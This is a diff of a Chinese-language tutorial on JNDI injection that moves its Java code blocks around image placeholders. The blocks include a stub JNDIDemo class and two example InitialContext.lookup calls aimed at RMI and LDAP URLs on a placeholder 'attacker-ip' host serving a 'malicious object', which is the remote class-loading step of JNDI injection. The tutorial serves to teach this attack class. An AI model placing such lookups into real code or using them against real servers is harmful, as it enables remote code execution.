@@ -98,9 +98,6 @@ JNDI注入的核心在于`javax.naming.InitialContext.lookup()`方法。该方�
 
 ![](img/9b28d368abfb9a24f122907b3553fbc7_82.png)
 
-```java
-import javax.naming.InitialContext;
-import javax.naming.NamingException;
 
 ![](img/9b28d368abfb9a24f122907b3553fbc7_84.png)
 
@@ -116,6 +113,9 @@ import javax.naming.NamingException;
 
 ![](img/9b28d368abfb9a24f122907b3553fbc7_96.png)
 
+```java
+import javax.naming.InitialContext;
+import javax.naming.NamingException;
 public class JNDIDemo {
     public static void main(String[] args) throws NamingException {
         InitialContext ctx = new InitialContext();
@@ -218,9 +218,6 @@ LDAP是轻量级目录访问协议，默认端口为389。它主要用于访问�
 
 ![](img/9b28d368abfb9a24f122907b3553fbc7_174.png)
 
-```java
-// RMI示例
-ctx.lookup("rmi://attacker-ip:1099/恶意对象");
 
 ![](img/9b28d368abfb9a24f122907b3553fbc7_176.png)
 
@@ -230,6 +227,9 @@ ctx.lookup("rmi://attacker-ip:1099/恶意对象");
 
 ![](img/9b28d368abfb9a24f122907b3553fbc7_182.png)
 
+```java
+// RMI示例
+ctx.lookup("rmi://attacker-ip:1099/恶意对象");
 // LDAP示例
 ctx.lookup("ldap://attacker-ip:389/恶意对象");
 ```
